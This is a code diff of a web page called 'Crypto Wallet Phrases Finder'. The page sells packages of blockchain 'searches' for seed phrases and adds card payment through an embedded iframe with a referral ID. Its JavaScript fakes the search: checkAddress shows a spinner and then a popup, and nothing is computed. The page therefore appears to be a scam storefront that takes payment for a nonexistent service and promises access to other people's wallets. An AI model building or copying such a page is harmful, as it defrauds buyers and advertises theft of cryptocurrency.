@@ -6,13 +6,15 @@
 <title>Crypto Wallet Phrases Finder</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&family=Orbitron:wght@400;700&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
 
   :root {
     --primary-color: #00ffff;
     --secondary-color: #ff00ff;
     --background-color: #0f0f1f;
     --text-color: #e0e0e0;
+    --accent-color: #ffcc00; /* Added accent color */
+    --card-background: rgba(255, 255, 255, 0.1);
   }
 
   body {
@@ -830,30 +832,119 @@
     background-color: #0090d9;
   }
 
-  .dots {
-    display: inline-block;
-    width: 30px;
+  .header-buttons {
+    display: flex;
+    justify-content: center;
+    gap: 1rem;
+    margin-top: 1rem;
   }
 
-  @keyframes blink {
-    0% { opacity: .2; }
-    20% { opacity: 1; }
-    100% { opacity: .2; }
+  .header-btn {
+    padding: 0.8rem 1.5rem;
+    border: none;
+    border-radius: 25px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    text-transform: uppercase;
+    letter-spacing: 1px;
   }
 
-  .dots span {
-    animation-name: blink;
-    animation-duration: 1.4s;
-    animation-iteration-count: infinite;
-    animation-fill-mode: both;
+  .ai-finder-btn {
+    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+    color: white;
   }
 
-  .dots span:nth-child(2) {
-    animation-delay: .2s;
+  .package-btn {
+    background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
+    color: white;
   }
 
-  .dots span:nth-child(3) {
-    animation-delay: .4s;
+  .wallet-btn {
+    background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+    color: white;
+  }
+
+  .header-btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+  }
+
+  .preview-section {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 15px;
+    padding: 30px;
+    margin-top: 40px;
+    margin-bottom: 40px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    text-align: center;
+  }
+
+  .preview-section h2 {
+    color: var(--primary-color);
+    margin-bottom: 20px;
+  }
+
+  .preview-container {
+    background: var(--card-background);
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    margin-top: 20px;
+  }
+
+  .preview-container iframe {
+    border: none;
+    width: 100%;
+    height: 600px;
+  }
+
+  .faq-section {
+    margin-top: 40px;
+    padding: 20px;
+  }
+
+  .faq-container {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+  }
+
+  .faq-item {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 10px;
+    overflow: hidden;
+    transition: all 0.3s ease;
+  }
+
+  .faq-question {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 600;
+    font-size: 1.1em;
+    padding: 15px 20px;
+    cursor: pointer;
+    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+    color: var(--background-color);
+  }
+
+  .faq-answer {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 300;
+    font-size: 1em;
+    padding: 0 20px;
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.3s ease, padding 0.3s ease;
+  }
+
+  .faq-item.active .faq-answer {
+    max-height: 500px;
+    padding: 15px 20px;
+  }
+
+  .faq-item:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 20px rgba(0, 255, 255, 0.2);
   }
 </style>
 </head>
@@ -863,6 +954,11 @@
       <h1>Crypto Wallet Phrases Finder</h1>
       <div class="online-counter">
         ONLINE NOW: <span id="online-count">0</span>
+      </div>
+      <div class="header-buttons">
+        <button class="header-btn ai-finder-btn" onclick="openPhrasesFinder()">ACCESS AI FINDER</button>
+        <button class="header-btn package-btn" onclick="scrollToPackages()">Buy A Searching Package</button>
+        <button class="header-btn wallet-btn" onclick="redirectToWallet()">MY WALLET</button>
       </div>
     </div>
     <div class="crypto-particles" id="crypto-particles"></div>
@@ -961,7 +1057,7 @@
           <p class="price">$50</p>
         </div>
         <ul class="package-features">
-          <li>2 Searches on the Blockchain of 2 Hours</li>
+          <li>2 Searches on the Blockchain of 1 Hour</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -973,7 +1069,7 @@
           <p class="price">$100</p>
         </div>
         <ul class="package-features">
-          <li>5 Searches on the Blockchain of 3 Hours</li>
+          <li>5 Searches on the Blockchain of 2 Hours</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -985,7 +1081,7 @@
           <p class="price">$180</p>
         </div>
         <ul class="package-features">
-          <li>10 Searches on the Blockchain of 4 Hours</li>
+          <li>10 Searches on the Blockchain of 3 Hours</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -997,7 +1093,7 @@
           <p class="price">$220</p>
         </div>
         <ul class="package-features">
-          <li>15 Searches on the Blockchain</li>
+          <li>15 Searches on the Blockchain of 4 Hours</li>
           <li>24/7 Support</li>
           <li>Real-time Progress Tracking</li>
         </ul>
@@ -1014,6 +1110,14 @@
           <li>Real-time Progress Tracking</li>
         </ul>
         <button class="purchase-btn" onclick="openModal('ultimate', 50, 400)">PURCHASE NOW</button>
+      </div>
+    </div>
+
+    <div class="preview-section">
+      <h2>Pay With Your Card</h2>
+      <p> Enter the Package Amount and Pay with Visa, Master Card, GooglePay, ApplePay:</p>
+      <div class="preview-container">
+        <iframe src="https://crypto.paybis.com/?refId=23046" frameborder="0" width="100%" height="600"></iframe>
       </div>
     </div>
 
@@ -1179,13 +1283,54 @@
     }
 
     function checkAddress() {
-      const popup = document.getElementById('popupNotification');
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        showPopup('popupNotification');
+      }, 4000);
+    }
+
+    function showLoading() {
+      const loadingOverlay = document.createElement('div');
+      loadingOverlay.id = 'loadingOverlay';
+      loadingOverlay.style.position = 'fixed';
+      loadingOverlay.style.top = '0';
+      loadingOverlay.style.left = '0';
+      loadingOverlay.style.width = '100%';
+      loadingOverlay.style.height = '100%';
+      loadingOverlay.style.background = 'rgba(0, 0, 0, 0.8)';
+      loadingOverlay.style.display = 'flex';
+      loadingOverlay.style.justifyContent = 'center';
+      loadingOverlay.style.alignItems = 'center';
+      loadingOverlay.style.zIndex = '9999';
+
+      const spinner = document.createElement('div');
+      spinner.style.width = '50px';
+      spinner.style.height = '50px';
+      spinner.style.border = '5px solid #f3f3f3';
+      spinner.style.borderTop = '5px solid #00ffff';
+      spinner.style.borderRadius = '50%';
+      spinner.style.animation = 'spin 1s linear infinite';
+
+      loadingOverlay.appendChild(spinner);
+      document.body.appendChild(loadingOverlay);
+    }
+
+    function hideLoading() {
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      if (loadingOverlay) {
+        loadingOverlay.remove();
+      }
+    }
+
+    function showPopup(popupId) {
+      const popup = document.getElementById(popupId);
       popup.style.display = 'block';
       setTimeout(() => {
         popup.style.display = 'none';
       }, 7000);
     }
-
+    
     function closePopup() {
       document.getElementById('popupNotification').style.display = 'none';
     }
@@ -1287,8 +1432,18 @@
       document.body.appendChild(loadingOverlay);
 
       setTimeout(() => {
-        window.location.href = 'https://walletcryp.com/';
+        loadingOverlay.remove();
+        showPopup('popupNotification');
       }, 2000);
+    }
+
+    function scrollToPackages() {
+      const packagesSection = document.querySelector('.packages');
+      packagesSection.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function redirectToWallet() {
+      window.location.href = 'wallet.html'; // Assuming the wallet page is named wallet.html
     }
 
     function openModal(package, searches, amount) {
